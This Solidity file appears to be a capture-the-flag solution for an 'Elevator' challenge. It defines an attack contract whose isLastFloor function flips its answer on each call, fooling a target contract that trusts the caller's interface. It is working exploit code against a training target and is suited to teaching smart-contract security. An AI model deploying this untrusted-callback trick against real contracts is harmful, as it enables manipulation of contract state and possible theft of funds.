// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorAttack {
    IElevator public target;
    bool public toggle = true;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function isLastFloor(uint) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack() external {
        target.goTo(10);
    }
}
